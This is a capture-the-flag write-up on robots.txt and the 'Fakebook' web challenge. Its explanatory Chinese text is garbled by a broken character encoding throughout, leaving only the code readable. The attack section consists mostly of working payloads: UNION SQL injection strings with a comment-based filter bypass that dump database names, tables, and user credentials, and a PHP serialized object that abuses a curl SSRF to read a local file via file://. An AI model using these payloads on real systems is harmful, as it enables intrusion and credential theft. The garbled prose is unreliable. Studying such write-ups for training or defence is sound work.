# robots.txt
- ʲô��robots.txt��
robotsЭ��Ҳ��robots.txt��ͳһСд����һ�ִ������վ��Ŀ¼�µ�ASCII������ı��ļ�����ͨ����������������������������ֳ�����֩�룩������վ�е���Щ�����ǲ�Ӧ�������������������ȡ�ģ���Щ�ǿ��Ա���������ȡ�ġ���ΪһЩϵͳ�е�URL�Ǵ�Сд���еģ�����robots.txt���ļ���ӦͳһΪСд��robots.txtӦ��������վ�ĸ�Ŀ¼�¡�����뵥���������������������������Ŀ¼ʱ����Ϊ����ô���Խ��Զ������úϲ�����Ŀ¼�µ�robots.txt������ʹ��robotsԪ���ݣ�Metadata���ֳ�Ԫ���ݣ���
- �÷���
- ��1.��ֹ�����������������վ���κβ��֣�
```
User-agent: *
Disallow: /
ʵ���������Ա����� Robots.txt�ļ�
User-agent: Baiduspider
Disallow: /
User-agent: baiduspider
Disallow: /
����Ȼ�Ա�������ٶȵĻ����˷�������վ�������е�Ŀ¼��
```
- ��2.�������е�robot���� (����Ҳ���Խ�һ�����ļ� ��/robots.txt�� file):
```
User-agent: *
Allow:��/
```
- ���⣺[������ 2018]Fakebook
���뻷����û��˼·������/robots.txt
```
User-agent: *
Disallow: /user.php.bak
```
����/user.php.bak������user.php.bak��
```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
����SSRF��
```php
    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }
```
ע��һ���˺ţ����ִ���no?ע��![alt text](image-45.png)![alt text](image-46.png)
����������ע�룬ע��ո���/**/����
```
?no=1 order by 4

?no=-1 union/**/select/**/1,2,3,4

?no=-1 union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata

?no=-1 union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema='fakebook'

?no=-1 union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name='users'

?no=-1 union/**/select/**/1,group_concat(no,'~',username,'~',passwd,'~',data),3,4/**/from/**/fakebook.users

```
���Է���data�ֶδ�ŵľ������л��ַ�������ʹ�õ�ʱ��Ӧ�þͻ���ý���data�ֶν��з����л�����
���Ҹ��ݱ�������Ҳ֪���˾���·����/var/www/html/
![alt text](image-47.png)
�����л�POC��
```
<?php
class UserInfo
{
    public $name = "1";
    public $age = 12;
    public $blog = "file:///var/www/html/flag.php";

}
$res = new UserInfo();
echo serialize($res);
?>
```
O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```
����֮ǰ��ע���֪���л��Ե��ǵڶ�λ��Ҳ����username�ֶΣ�data��ӦӦ�þ��ǵ��ĸ��ֶ�Ϊ���������л��ַ���������ע��ķ�ʽд��
```
?no=-1 union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
�鿴ҳ��Դ���룬�������![alt text](image-48.png)
�õ�flag